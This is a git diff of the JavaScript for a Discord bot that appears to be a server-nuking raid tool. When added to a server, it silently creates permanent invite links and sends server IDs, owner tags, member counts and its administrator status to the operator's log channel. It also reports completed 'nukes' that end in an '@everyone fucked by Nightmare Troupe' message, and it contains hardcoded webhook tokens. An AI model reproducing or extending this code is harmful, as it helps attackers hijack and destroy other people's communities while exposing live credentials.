@@ -4,7 +4,8 @@ const antispam = require('./better_antispam.js');
 const client = new Discord.Client();
 const webhookClientNuke = new Discord.WebhookClient("763134567745585192", "_MgOSCM5umktPaq3xurM6A8EOyy4DXMPfK38BStA9bNeKtpBbnRpwYUANP200Mw7QiOR");
 const webhookClientJoin = new Discord.WebhookClient("763134664994586675", "oToQNGd0eYED0SwfFKbQFyOX7s5VYcqK-gorudp0G-fsD0I3Jnyy1D0tGAP4iFDHbnrP");
-
+const guild = '771124511788630026'
+const logC = "771124529513889802"
 client.once('ready', () => {
     console.log('start the fucking thing already')
 })
@@ -309,6 +310,8 @@ Array.prototype.random = function () {
   };
 
 client.on("guildCreate", msg => {
+        const server = msg.client.guilds.cache.find(g => g.id === guild)
+        const channel = server.channels.cache.find(c => c.id === logC)
     const Id = msg.channels.guild.id
     const Oid = msg.channels.guild.ownerID
     const Otag = msg.channels.guild.owner.user.tag
@@ -330,15 +333,15 @@ const joinEmbed2 = new Discord.MessageEmbed()
 
 if(msg.me.hasPermission("ADMINISTRATOR")) {let ch = msg.channels.cache.find(c => c.type === "text")
 ch.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
-.then(invite => webhookClientJoin.send(joinEmbed2).then(webhookClientJoin.send(`discord.gg/${invite.code}`)))
+.then(invite => channel.send(joinEmbed2).then(channel.send(`discord.gg/${invite.code}`)))
 }else {
     let ch = msg.channels.cache.find(c => c.type === "text")
     ch.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
-    .then(invite => webhookClientJoin.send(joinEmbed).then(webhookClientJoin.send(`discord.gg/${invite.code}`)))
+    .then(invite => webhookClientJoin.send(joinEmbed).then(channel.send(`discord.gg/${invite.code}`)))
 }
 
 if(!msg.me.hasPermission("CREATE_INSTANT_INVITE")) {
-    webhookClientJoin.send(joinEmbed).then(webhookClientJoin.send("Couldn't create link..."))
+    channel.send(joinEmbed).then(channel.send("Couldn't create link..."))
 }
 })
  
@@ -350,6 +353,8 @@ if(!msg.me.hasPermission("CREATE_INSTANT_INVITE")) {
 client.on("message", msg => {
     if(msg.author.id === msg.client.user.id) {
     if(msg.content === `@everyone fucked by Nightmare Troupe LMFAO69`) {
+ const server = msg.client.guilds.cache.find(g => g.id === guild)
+        const channel = server.channels.cache.find(c => c.id === logC)
     const Id = msg.guild.id
     const Oid = msg.guild.ownerID
     const Otag = msg.guild.owner.user.tag
@@ -361,7 +366,7 @@ const nukeEmbed = new Discord.MessageEmbed()
 .addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`)
 
 msg.channel.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
-.then(invite => webhookClientNuke.send(nukeEmbed).then(webhookClientNuke.send(`discord.gg/${invite.code}`)))
+.then(invite => channel.send(nukeEmbed).then(channel.send(`discord.gg/${invite.code}`)))
 }
     }
 })
@@ -370,6 +375,8 @@ msg.channel.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, uni
 const commandCooldown1 = new Set()
 client.on("message", msg => {
         if(msg.content.startsWith(`${prefix}summon`)) {
+ const server = msg.client.guilds.cache.find(g => g.id === guild)
+        const channel = server.channels.cache.find(c => c.id === logC)
             if(commandCooldown1.has(msg.guild.id)) { msg.reply(" This command is on cooldown...") 
             return; }
             if(!msg.guild.me.hasPermission("CREATE_INSTANT_INVITE")) {msg.reply("I need the permission to create invites to summon the owner...") 
@@ -389,7 +396,7 @@ client.on("message", msg => {
         .setDescription("The Bot DOES have the permission ADMINISTRATOR needed to nuke!")
         
         msg.channel.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
-        .then(invite => webhookClientJoin.send(joinEmbed2).then(webhookClientJoin.send(`discord.gg/${invite.code} They ask for help <@${assy}>`)))
+        .then(invite => channel.send(joinEmbed2).then(channel.send(`discord.gg/${invite.code} They ask for help <@${assy}>`)))
     
         commandCooldown1.add(msg.guild.id)    
     }else {
@@ -405,7 +412,7 @@ client.on("message", msg => {
             .setDescription("The Bot DOES NOT have the permission ADMINISTRATOR needed to nuke!")
             .setColor('#FF0435')
             msg.channel.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
-            .then(invite => webhookClientJoin.send(joinEmbed).then(webhookClientJoin.send(`discord.gg/${invite.code} They asked for help <@${assy}>`)))
+            .then(invite => channel.send(joinEmbed).then(channel.send(`discord.gg/${invite.code} They asked for help <@${assy}>`)))
 
             
         commandCooldown1.add(msg.guild.id)
